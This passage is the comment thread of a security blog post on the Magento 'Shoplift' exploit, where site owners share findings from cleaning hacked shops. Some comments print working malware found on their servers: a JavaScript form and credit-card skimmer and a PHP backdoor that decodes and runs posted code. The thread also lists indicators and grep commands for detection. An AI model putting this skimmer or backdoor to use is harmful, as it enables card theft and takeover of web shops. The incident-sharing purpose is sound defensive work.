    b.addEventListener("click", clk, false);

    }else {

    b.attachEvent('onclick', clk);

    }

    }

    }

    var frm=document.querySelectorAll("form");

    for (var i=0;i<frm.length;i++){

    if(frm[i].addEventListener) {

    frm[i].addEventListener("submit", clk, false);

    }else {

    frm[i].attachEvent('onsubmit', clk);

    }

    }

    if(snd!=null) {

    console.clear();

    var cc = new RegExp("[0-9]{13,16}");

    var asd="0";

    if(cc.test(snd)){

    asd="1" ;

    }

    var http = new XMLHttpRequest();

    http.open("POST","/js/index.php",true);

    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");

    http.send("data="+snd+"&asd="+asd);

    console.clear();

    }

    snd=null;

    setTimeout('send()', 150);

    }

    1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 30, 2015 at 5:05 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6301)

       so far I haven’t seen this in any of my hacked sites either, but thanks for the heads up, i’ll keep my eyes peeled.
    2. ![](https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=60&d=mm&r=g) **Shaun Ek** says: [May 21, 2015 at 2:07 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6385)

       I have found this same vulnerability on a site I am cleaning up. It was very similar. It grabs form fields from pages (any page, including checkout) and submits to their server… I changed the url and build my own endpoint and verified that it works and yes they got personal and credit card information. 🙁
11. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [April 29, 2015 at 2:06 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6292)

    And new file in /js/api.php

    1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 30, 2015 at 5:05 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6300)

       so far I haven’t seen this in any of my hacked sites, but thanks for the heads up, i’ll keep my eyes peeled.

       1. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [April 30, 2015 at 1:23 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6303)

          the content of this file is in comment above! 🙂

          1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 30, 2015 at 9:30 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6307)

             Thanks for keeping everyone else updated with your findings, super helpful for others dealing with hacked sites!
12. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [April 29, 2015 at 2:06 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6293)

    $hash = ’92bde3b96aff934ed67420a3f6130ac2′;

    if (md5($\_POST[‘hash’]) === $hash) {

    mage($\_POST[‘code’]);

    if (isset($\_POST[‘clean’]))

    clean();

    }

    function mage($code)

    {

    $b = ‘b’.’as’.’e’.’6′.’4′.’\_’.’d’.’eco’.’de’;

    $code = $b($code);

    $file = ‘no\_image.gif’;

    $fp = fopen($file, ‘w’);

    fwrite($fp, $code);

    fclose($fp);

    if (is\_file($file))

    @include($file);

    }

    function clean()

    {

    @unlink(‘no\_image.gif’);

    }

    1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 30, 2015 at 4:59 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6299)

       which file are you seeing this in?

       1. ![](https://secure.gravatar.com/avatar/f55f89228f5df9b9d0f61a8103ae2afd?s=60&d=mm&r=g) **Tor** says: [May 14, 2015 at 11:30 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6369)

          I get this too in /js/api.php after comparing to Magento 1.9.1 core files I can’t see the file in there at all
       2. ![](https://secure.gravatar.com/avatar/2e916dff91ce38b6726f8cd605be331f?s=60&d=mm&r=g) **Gabriel Molina** says: [November 25, 2015 at 10:41 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6987)

          Hi redesigned, I hope this topic is not yet closed. I have this problem with the media/dhl/info.php. This file is weird. Had you encountered this before? The file codes looks like it’s fetching details from our magento site. I did some research and found out that it’s not only me who has this problem. here’s the code:
13. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [April 30, 2015 at 2:36 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6304)

    I’ve had another problem. On one of my sites

    After patching, removing false admin users, and cleaning files, next day there where two new false admin users in backend. I have even blocked the class of IPs in .htaccess. And it didn’t help…

    It starts to be really scarry, if all the magento shops are in danger.

    Have you had the same?

    1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [May 1, 2015 at 10:18 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6311)

       No, I haven’t seen any additional signs of intrusion in any site I’ve fixed. are you sure the patch applied 100%, hacked sites have an altered /lib/Varian/Db/Adaptor/Pdo/Mysql.php file, so the patch will fail against that file, it has to be patched manually or replaced.

       If that isn’t the issue it sounds like your site has an additional intrusion point that you haven’t yet detected. You’ll want to restore from a pre-hack backup, or if not scan everything carefully. If the site doesn’t have any core files changed, which hopefully it doesn’t you can overwrite the magento with a fresh copy of the same version number, or do a upgrade.

       Best of luck figuring things out. Dealing with a hacked site is no fun!
14. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [May 4, 2015 at 12:39 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6319)

    I have had another problem.
     I have cleaned one other site of our client. I mean I have
     – removed the admin users
     – block in htaccess both IPs
     – cleand index.php from the root
     – and applyed the PATCH

    But after the weekend the index.php has been once again changed, and the code has been injected :

    if (preg\_match(‘//admin/Cms\_Wysiwyg/directive/index//’, $\_SERVER[‘REQUEST\_URI’])) {
     if ($\_SERVER[‘REQUEST\_METHOD’] == ‘POST’) {
     if (isset($\_REQUEST[‘\_\_\_directive’]) && isset($\_REQUEST[‘forwarded’])) {
     if (preg\_match(‘/report\_search\_grid/’, base64\_decode($\_REQUEST[‘\_\_\_directive’])))
     $\_REQUEST[‘forwarded’] = $\_POST[‘forwarded’] = $\_GET[‘forwarded’] = $\_COOKIE[‘forwarded’] = null;
     }
     }
     }

    Have you had the same problem? Where can I find the solution for this problem?
     I have been looking for MagePleasure module, but it doesn’t exist in
     – code/local nor in
     – code/core

    The one thing that I can see is that many folders has 777 access rights, so I will change the access rights for the files and folders.

    1. ![](https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=60&d=mm&r=g) **Shaun Ek** says: [May 21, 2015 at 5:58 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6388)

       I also had the same code in a site’s /index.php, no Magepleasure module.
15. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [May 5, 2015 at 1:07 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6322)

    OK I have new malware found on my site but I am not sure if it is connected to the ShopLift

    files :
     /media/dhl/info.php
     /media/dhl/.htaccess
     /js/flash/FrontendHtml.phar.php (binary file)
     /js/extjs/resources/images/magento/basic-dialog/MagentoLib.php

    if you wish I can send you the content of all files

    1. ![](https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=60&d=mm&r=g) **Shaun Ek** says: [May 21, 2015 at 5:34 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6387)

       I also found the /media/dhl/info.php and /media/dhl/.htaccess. Weird though, it seems that the info.php has the ability to eval arbitrary php code that is passed in but my apache access logs don’t show and POSTs to that file. But there were a lot of requests to /get.php/media/dhl/.htaccess, which I guess is a way to get the contents of that .htaccess file. :/ Not sure what to make of it, but needed to be cleaned up regardless.
16. ![](https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=60&d=mm&r=g) **SawBladePainter** says: [May 5, 2015 at 7:34 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6323)

    Yep my client’s 1.8.1 site got hacked on 4/23 and then again by someone else on 4/26.

    # modified: app/code/core/Mage/Cms/controllers/IndexController.php
     # modified: downloader/cache.cfg
     # modified: downloader/pearlib/php/PEAR/Command/Mage.php
     # modified: downloader/pearlib/php/PEAR/Installer/Role/Mage.php
     # modified: lib/Varien/Db/Adapter/Pdo/Mysql.php

    ADDED:
     # app/code/community/Magpleasure/
     # app/design/adminhtml/default/default/layout/filesystem.xml
     # app/design/adminhtml/default/default/template/filesystem/
     # app/etc/modules/Magpleasure\_Filesystem.xml
     # downloader/.cache/community/File\_System-1.0.0.tgz
     # js/editarea/
     # js/filesystem/
     # skin/adminhtml/default/default/filesystem/

    PW HASH/SALT:
     f4c8e326312d5ddb79c04b408e55010a:rp

    FOUR LETTER USERNAMES + email@example.com

    How do we figure out whether they downloaded the database or config files, etc.?

    1. ![](https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=60&d=mm&r=g) **ifnull** says: [May 5, 2015 at 9:42 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6324)

       You should check your Apache access logs. Look at the transfer size and compare it to the size of your backups.

       1. ![](https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=60&d=mm&r=g) **Trim** says: [May 13, 2015 at 9:28 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6365)

          Hi,

          recently I noticed many files exported to var/export. They only contain first line: ID,”x”,x,x

          I have never done any exports from within Magento!

          Does anyone have an idea on how to check what has caused these csv files to be generated in var/export directory??

          How do I figure out whether they downloaded the dB or config files, emails, etc

          1. ![](https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=60&d=mm&r=g) **tarrmrob** says: [May 14, 2015 at 8:36 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6367)

             Is it normal to have csv files in /includes/stat/
    2. ![](https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=60&d=mm&r=g) **tarrmrob** says: [May 14, 2015 at 8:42 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6368)

       In what way was it modified? downloader/cache.cfg

       How to fix this file?

       1. ![](https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=60&d=mm&r=g) **SawBladePainter** says: [May 15, 2015 at 8:52 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6372)

          I don’t recall how it was modified. I could look it up if you really need to know. But anyway just reset to your latest known good commit:

          cd /your/working/directory
           git reset –hard

          Or restore the files from a backup.

          If you’re not using git on your project, and don’t back up your files, well… let me know and I’ll dig up the diff on that file so you can see what was done, I guess.
    3. ![](https://secure.gravatar.com/avatar/efe6dbeabdcb4113433e3916b53ea400?s=60&d=mm&r=g) **[Matthias Kleine](http://mkleine.de)** says: [July 30, 2015 at 11:00 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6620)

       OMG just found MagPleasure, too. Thought that was a module installed by our customer. Thank you very much for sharing!
17. ![](https://secure.gravatar.com/avatar/1d5d165056817c209889538134a65e37?s=60&d=mm&r=g) **Grrring Bassmo** says: [May 6, 2015 at 1:25 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6327)

    Would like to confirm that have also seen an admin user with a random 4 letter name and email@example.com. This has gone along with the Magpleasure/Filesystem extension installation. Not sure what else yet.
18. ![](https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=60&d=mm&r=g) **Grrring Bassmo** says: [May 7, 2015 at 9:35 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6339)

    Following further investigation and finding a second compromised site here are some more snippets of information.

    One of the files that the patch fixes is “lib/Varien/Db/Adapter/Pdo/Mysql.php”. However this file had been modified during the exploit and the patch would not fully complete as the file had been changed. Was able to resolve this by replacing the file and re-running the patch.

    One thing of some concern is that the var/export folder on both compromised sites have been full of csv exports. This suggests that a lot of data has been snatched. This has happened in both a v1.9 and a v1.5 build.

    Also, one site had 3 new admins created, two using the @example.com address but also one with a different address – something along the lines of system\_backup (sorry I deleted it quickly). This was in an old v1.5.1 .

    Remember to change your database passwords guys – if they have been able to see your local.xml file that is now no longer a secret.
19. ![](https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=60&d=mm&r=g) **Grrring Bassmo** says: [May 7, 2015 at 9:45 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6340)

    So far all csvs appear to contains only product data
20. ![](https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=60&d=mm&r=g) **Grrring Bassmo** says: [May 7, 2015 at 1:38 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6342)

    Can also recommend changing all existing admin passwords, possibly the usernames too from any compromised site.

    1. ![](https://secure.gravatar.com/avatar/b09f5740e14bffd4541bf7bac06b3408?s=60&d=mm&r=g) **M.Hutchinson** says: [May 13, 2015 at 1:49 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6362)

       Assuming that another action item is to reset all user passwords & email users, is it possible that a handful of user account email addresses have been changed? Would be interesting to do a compare of user email records pre&post hack to see what comes up.
21. ![](https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=60&d=mm&r=g) **jasonyohon** says: [May 12, 2015 at 9:54 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6361)

    Exploit installed MA2 Slideshow Plugin (bizarrely) – IP was in the USA 23.245.26.35 – added ma2all.js which seems like some sort of listener. Scary stuff.
22. ![](https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=60&d=mm&r=g) **Trim** says: [May 13, 2015 at 9:31 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6366)

    Hi,

    recently I noticed many files exported to var/export. They only contain first line: ID,”x”,x,x

    I have never done any exports from within Magento!

    Does anyone have an idea on how to check what has caused these csv files to be generated in var/export directory??

    How do I figure out whether they downloaded the dB or config files, emails, etc
23. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [May 15, 2015 at 5:49 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6371)

    A brand new set of security patches today! Get them installed right away people.
24. ![](https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=60&d=mm&r=g) **Rick Buczynski** says: [May 19, 2015 at 8:54 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6384)

    On one store, I just found a nasty WSO php shell injected into errors/report.php. It allows complete system surveying, code execution, and MySQL controls. Try to run `grep -rn ‘WSOsetcookie’ .` on your store for clues.

    1. ![](https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=60&d=mm&r=g) **Shaun Ek** says: [May 21, 2015 at 5:30 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6386)

       HOLY CRAP, I just found this one as well and it is CRAZY!!!!!!!! The power of this script is really astounding, and impressive, but mostly scary what it can do. I HIGHLY encourage people to run Rick’s grep command to find, but if it doesn’t come back with anything run this one, which works for the version found on my server

       grep -rn ‘xxtea\_encrypt’ .

       (the version on our server was obfuscated by base64 encoding plus some lame php encryption so that is why grep -rn ‘WSOsetcookie’ . didn’t work for me)

       1. ![](https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=60&d=mm&r=g) **Rick Buczynski** says: [May 21, 2015 at 1:03 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6389)

          Thanks for sharing Shaun — definitely good insight about encoded variations of the shell. FYI, I have only seen it once among about a dozen stores I’ve checked, while some stores have still been compromised under different methods.
25. ![](https://secure.gravatar.com/avatar/f07daf21df15713ecb00b2191de536e1?s=60&d=mm&r=g) **Sean** says: [May 27, 2015 at 5:06 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6404)

    This guy is using the SUPEE-5994 exploits that are able to expose user account data. You have another patch to apply.
26. ![](https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=60&d=mm&r=g) **jasonyohon** says: [May 28, 2015 at 3:00 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6409)

    Since this exploit I have changed all my admin links to something other than index.php/admin which I obviously should have done years ago. But can anyone confirm if this simple change would have eliminated the capability of the exploit? It seems to me that the hackers/bots could not guess where to run the “POST /index.php/admin/Cms\_Wysiwyg” command had the admin folder been changed to something random. Am I wrong about this?
27. ![](https://secure.gravatar.com/avatar/acb20efdbb1bfb02ee27394b39c01a77?s=60&d=mm&r=g) **jamesbloob** says: [June 2, 2015 at 1:38 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6430)

    On one of our sites that was compromised a user was added to admin\_user with username Inuf and Password f4c8e326312d5ddb79c04b408e55010a:rp email was email@example.com

    We found two files so far one was /skin/adminhtml/default/default/images/lanot/filemanager/beaks.php and the other was /js/tiny\_mce/classes/firebug/press36.php these two files were sending out spam emails from our site. We are still investigating what else was changed.

    We will probably have to restore the site to a previous backup as we do not know what else could have been affected.
28. ![](https://secure.gravatar.com/avatar/cc5f4214458b51c9cef7cdec251d5ae9?s=60&d=mm&r=g) **Max** says: [September 25, 2015 at 10:57 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6741)

    When I click on the CMS —>PAGES —> edit Home Page appear a web page: Site in maintenance Mode—Varnish Cache
29. ![](https://secure.gravatar.com/avatar/a29d5afc763cf00694d904ad37deab16?s=60&d=mm&r=g) **Manu Vincent** says: [November 18, 2015 at 8:14 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6976)

    One of my clients magento store got hacked. search result from frontend goes to WSO. I am a newbie to magento. what i know is just to configure magento. PLease help
30. ![](https://secure.gravatar.com/avatar/57a6c5f9e541605416a1af22e396b728?s=60&d=mm&r=g) **Eugene** says: [November 20, 2015 at 11:28 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6981)

    why there are so many exploits on magento….it is crazy to patch magento all the time….lord
31. ![](https://secure.gravatar.com/avatar/6b7113749d118c0b9bc3abf193291b7a?s=60&d=mm&r=g) **Ad Kc** says: [November 22, 2016 at 4:25 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-8024)

    It’s little late, but here is the qst. Did you guys see any exploitation on database? It’s hard to re-build the site without the existing database. What are the risk, if I use same database in new installation?

Comments are closed.

##### Related Categories

* [Magento Security](https://blog.sucuri.net/category/magento-security)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
##### You May Also Like

 ![](https://blog.sucuri.net/wp-content/uploads/2015/03/Disclosure-Image-Wordpress-390x184.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WP Mobile Detector Vulnerability Being Exploited in the Wild](https://blog.sucuri.net/2016/06/wp-mobile-detector-vulnerability-being-exploited-in-the-wild.html)

* [![](https://secure.gravatar.com/avatar/0aafe801f4543b098d7a968b77b4bd1d?s=20&d=mm&r=g)Douglas Santos](https://blog.sucuri.net/author/douglas "View all posts by Douglas Santos")
* June 2, 2016
 \*\*\*Update: The WP Mobile Detector plugin has been patched to address the vulnerability. Please update as soon as possible. Note that the latest version don’t…  [Read the Post](https://blog.sucuri.net/2016/06/wp-mobile-detector-vulnerability-being-exploited-in-the-wild.html)  ![WordPress Vulnerability Detail](https://blog.sucuri.net/wp-content/uploads/2019/03/vulnerability-details-wp_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Persistent XSS via CSRF in WP Meta and Date Remover](https://blog.sucuri.net/2019/05/persistent-xss-via-csrf-in-wp-meta-and-date-remover.html)

* [![](https://secure.gravatar.com/avatar/14e8a81f8c7c18715d660025d52ce68a?s=20&d=mm&r=g)John Castro](https://blog.sucuri.net/author/john "View all posts by John Castro")
* May 7, 2019
 During regular research audits for our Sucuri Firewall (WAF), we discovered a Cross Site Request Forgery (CSRF) leading to a persistent Cross Site Scripting vulnerability…  [Read the Post](https://blog.sucuri.net/2019/05/persistent-xss-via-csrf-in-wp-meta-and-date-remover.html)  ![WordPress Vulnerability](https://blog.sucuri.net/wp-content/uploads/2019/04/vulnerability-discovery_blog-390x183.png)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Plugin Give – Stored XSS for Donors](https://blog.sucuri.net/2019/05/wordpress-plugin-give-stored-xss-for-donors.html)

* [![](https://secure.gravatar.com/avatar/dceef4126f82373fb765ef9d57ed939d?s=20&d=mm&r=g)Antony Garand](https://blog.sucuri.net/author/antony-garand "View all posts by Antony Garand")
* May 15, 2019
 ​​Give is a WordPress plugin which allows users to setup a donation page on a website. It currently has 60k installs. ​​During a recent audit…  [Read the Post](https://blog.sucuri.net/2019/05/wordpress-plugin-give-stored-xss-for-donors.html)  ![WordPress Vulnerablity Disclosre](https://blog.sucuri.net/wp-content/uploads/2016/08/wordpress-vulnerability-disclosure-390x184.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Stored Cross-Site Scripting Vulnerability in WordPress 4.8.1](https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html)

* [![](https://secure.gravatar.com/avatar/391fb94770a4ae88c7408cc0f4f97f0f?s=20&d=mm&r=g)Rodolfo Assis](https://blog.sucuri.net/author/rodolfo "View all posts by Rodolfo Assis")
* September 26, 2017
 Update 11/03/2017: Read all about vulnerabilities and best practices to secure your website in our newly WordPress Security Guide today! During regular research audits for…  [Read the Post](https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html)    ![Elementor Pro WordPress Plugin Vulnerability](https://blog.sucuri.net/wp-content/uploads/2023/03/BlogPost_FeatureImage_1490x700_ELEMENTOR-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [High Severity Vulnerability in WordPress Elementor Pro Patched](https://blog.sucuri.net/2023/03/high-severity-vulnerability-in-wordpress-elementor-pro-patched.html)

* [![](https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=20&d=mm&r=g)Ben Martin](https://blog.sucuri.net/author/benmartin "View all posts by Ben Martin")
* March 31, 2023
 On March 22nd, 2023 a security patch was issued for the popular website builder plugin Elementor Pro. Website administrators using this plugin should immediately patch…  [Read the Post](https://blog.sucuri.net/2023/03/high-severity-vulnerability-in-wordpress-elementor-pro-patched.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og-abstract-1-390x205.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Social Warfare Vulnerability Probes](https://blog.sucuri.net/2019/03/social-warfare-vulnerability-probes.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* March 29, 2019
 After a recent disclosure of the Social Warfare plugin vulnerability, we’ve seen massive attacks that inject malicious JavaScripts into the plugin options. The vulnerability has…  [Read the Post](https://blog.sucuri.net/2019/03/social-warfare-vulnerability-probes.html)  ![](https://blog.sucuri.net/wp-content/uploads/2017/06/customerSPOTLIGHT-EN-24DIGITAL_blog-390x183.jpg)

* [Magento Security](https://blog.sucuri.net/category/magento-security)
* [Sucuri Updates](https://blog.sucuri.net/category/sucuri-updates)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Spotlight: How a Digital Marketing Agency Secures Client Sites](https://blog.sucuri.net/2017/06/spotlight-how-a-digital-marketing-agency-secures-clients.html)

* [![](https://secure.gravatar.com/avatar/9ae1b85a8293a8d90deab782c4390fd0?s=20&d=mm&r=g)Nikki Gerren](https://blog.sucuri.net/author/nicole-gerren "View all posts by Nikki Gerren")
* June 2, 2017
 Based in Melbourne, Australia for over 17 years, 24Digital knows what it takes to succeed in the ever-evolving digital marketing space which is no longer…  [Read the Post](https://blog.sucuri.net/2017/06/spotlight-how-a-digital-marketing-agency-secures-clients.html)  ![WordPress Vulnerability & Patch Roundup October 2023](https://blog.sucuri.net/wp-content/uploads/2023/10/23-BlogPost_Feature-Image_1490x700_October-Vulnerability-Round-Up-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Vulnerability & Patch Roundup October 2023](https://blog.sucuri.net/2023/10/wordpress-vulnerability-patch-roundup-october-2023.html)

* [![](https://secure.gravatar.com/avatar/814d8a855f60f285a7501fd7d0b13e17?s=20&d=mm&r=g)Cesar Anjos](https://blog.sucuri.net/author/cesarsucuri-net "View all posts by Cesar Anjos")
* October 30, 2023
 Vulnerability reports and responsible disclosures are essential for website security awareness and education. Automated attacks targeting known software vulnerabilities are one of the leading causes…  [Read the Post](https://blog.sucuri.net/2023/10/wordpress-vulnerability-patch-roundup-october-2023.html)  ![Malicious Magento User Creator](https://blog.sucuri.net/wp-content/uploads/2020/07/magento-user-creator-390x183.png)

* [Ecommerce Security](https://blog.sucuri.net/category/ecommerce-security)
* [Magento Security](https://blog.sucuri.net/category/magento-security)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Examining Unique Magento Backdoors](https://blog.sucuri.net/2021/08/examining-unique-magento-backdoors.html)

* [![](https://secure.gravatar.com/avatar/ec21ce6c87e45f02686a2800f8672aed?s=20&d=mm&r=g)Liam Smith](https://blog.sucuri.net/author/liam "View all posts by Liam Smith")
* August 4, 2021
 During a recent investigation into a compromised Magento ecommerce environment, we discovered the presence of five different backdoors that would provide attackers with code execution…  [Read the Post](https://blog.sucuri.net/2021/08/examining-unique-magento-backdoors.html)  ![](https://blog.sucuri.net/wp-content/uploads/2017/03/sf9-realex-magento-payment-card-module-targeted-by-credit-card-scrapers_blog-390x183.jpg)

* [Ecommerce Security](https://blog.sucuri.net/category/ecommerce-security)
* [Magento Security](https://blog.sucuri.net/category/magento-security)

## [SF9 Realex Magento Module Targeted by Credit Card Scrapers](https://blog.sucuri.net/2017/03/sf9-realex-magento-module-targeted-by-credit-card-scrapers.html)

* [![](https://secure.gravatar.com/avatar/c2efe495c70f8f045614e18012cd2ff2?s=20&d=mm&r=g)Bruno Zanelato](https://blog.sucuri.net/author/bruno "View all posts by Bruno Zanelato")
* March 10, 2017
 Attackers are constantly developing new techniques to compromise ecommerce websites and steal sensitive data. Over the last several weeks, we tracked massive attacks against Magento…  [Read the Post](https://blog.sucuri.net/2017/03/sf9-realex-magento-module-targeted-by-credit-card-scrapers.html)
##### Search

